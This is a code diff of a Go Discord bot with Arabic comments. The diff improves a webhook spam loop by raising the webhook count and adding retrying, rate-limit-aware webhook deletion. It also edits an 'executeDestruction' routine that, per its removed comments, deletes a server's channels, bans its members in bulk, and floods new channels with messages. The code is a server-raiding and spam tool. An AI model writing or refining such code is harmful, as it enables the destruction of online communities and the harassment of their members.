@@ -7,6 +7,7 @@ import (
 	"net/http"
 	"os"
 	"os/signal"
+	"strings"
 	"sync"
 	"syscall"
 	"time"
@@ -31,7 +32,6 @@ func main() {
 		return
 	}
 
-	// تم تعديل الـ Intents وتفعيل جميع الصلاحيات لتجنب أي أخطاء تعريف
 	sess.Identify.Intents = discordgo.IntentsAll
 
 	cmdWhSpam := "wh_spam"
@@ -181,6 +181,8 @@ func main() {
 func runWebhookSpamLoop(token, channelID, webhookName, messageContent string, totalGoal int, s *discordgo.Session) {
 	sentCounter := 0
 	var mu sync.Mutex
+	
+	webhookCount := 10
 
 	for {
 		mu.Lock()
@@ -190,20 +192,20 @@ func runWebhookSpamLoop(token, channelID, webhookName, messageContent string, to
 		}
 		mu.Unlock()
 
-		urls := createFiveWebhooks(token, channelID, webhookName)
+		urls := createWebhooks(token, channelID, webhookName, webhookCount)
 		if len(urls) == 0 {
 			time.Sleep(500 * time.Millisecond)
 			continue
 		}
 
 		burstSendFast(urls, messageContent, &sentCounter, totalGoal, &mu)
-		deleteFiveWebhooks(token, urls)
+		deleteWebhooks(token, urls)
 	}
 
 	s.ChannelMessageSend(channelID, "🎉 تم الانتهاء من عدد رسائل الويب هوك المطلوبة!")
 }
 
-func createFiveWebhooks(token, channelID, webhookName string) []string {
+func createWebhooks(token, channelID, webhookName string, count int) []string {
 	headers := map[string]string{
 		"Authorization": "Bot " + token,
 		"Content-Type":  "application/json",
@@ -214,7 +216,7 @@ func createFiveWebhooks(token, channelID, webhookName string) []string {
 	var mu sync.Mutex
 	var wg sync.WaitGroup
 
-	for i := 0; i < 5; i++ {
+	for i := 0; i < count; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
@@ -249,7 +251,7 @@ func createFiveWebhooks(token, channelID, webhookName string) []string {
 	return activeURLs
 }
 
-func deleteFiveWebhooks(token string, urls []string) {
+func deleteWebhooks(token string, urls []string) {
 	headers := map[string]string{
 		"Authorization": "Bot " + token,
 		"User-Agent":    "DiscordBot (https://discord.com, v10)",
@@ -260,17 +262,42 @@ func deleteFiveWebhooks(token string, urls []string) {
 		wg.Add(1)
 		go func(whURL string) {
 			defer wg.Done()
-			req, _ := http.NewRequest("DELETE", whURL, nil)
-			for k, v := range headers {
-				req.Header.Set(k, v)
+			
+			// استخراج الـ ID من رابط الويب هوك لضمان إرسال طلب الحذف بالشكل الصحيح
+			parts := strings.Split(whURL, "/")
+			if len(parts) < 2 {
+				return
 			}
-			resp, err := httpClient.Do(req)
-			if err == nil {
+			webhookID := parts[len(parts)-2]
+
+			delReq, _ := http.NewRequest("DELETE", "https://discord.com/api/v10/webhooks/"+webhookID, nil)
+			for k, v := range headers {
+				delReq.Header.Set(k, v)
+			}
+
+			for attempt := 0; attempt < 3; attempt++ {
+				resp, err := httpClient.Do(delReq)
+				if err != nil {
+					time.Sleep(50 * time.Millisecond)
+					continue
+				}
+				
+				if resp.StatusCode == http.StatusNoContent || resp.StatusCode == http.StatusOK {
+					resp.Body.Close()
+					break
+				} else if resp.StatusCode == 429 {
+					resp.Body.Close()
+					time.Sleep(100 * time.Millisecond)
+					continue
+				}
 				resp.Body.Close()
+				break
 			}
 		}(url)
 	}
 	wg.Wait()
+	// تأخير بسيط لضمان استقرار السيرفرات واستلام ديسكورد للطلبات بالكامل
+	time.Sleep(100 * time.Millisecond)
 }
 
 func burstSendFast(urls []string, messageContent string, sentCounter *int, totalGoal int, mu *sync.Mutex) {
@@ -338,7 +365,6 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		"User-Agent":    "DiscordBot (https://discord.com, v10)",
 	}
 
-	// 1. حذف الرومات الحالية
 	req, err := http.NewRequest("GET", "https://discord.com/api/v10/guilds/"+guildID+"/channels", nil)
 	if err == nil {
 		for k, v := range headers {
@@ -370,7 +396,6 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		}
 	}
 
-	// 2. تجميع الأعضاء وتبنيدهم بأمان عبر المكتبة الرسمية
 	go func() {
 		after := ""
 		for {
@@ -399,7 +424,6 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 		}
 	}()
 
-	// 3. إنشاء الرومات الجديدة والسبام فيها بالعدد الكامل
 	var channelIDs []string
 	var mu sync.Mutex
 	var wgCreate sync.WaitGroup
@@ -464,7 +488,7 @@ func executeDestruction(s *discordgo.Session, token, guildID, roomName string, r
 				msgResp.Body.Close()
 				time.Sleep(15 * time.Millisecond)
 			}
-		}(chID)
+		}(cID)
 	}
 	wgMsg.Wait()
 }
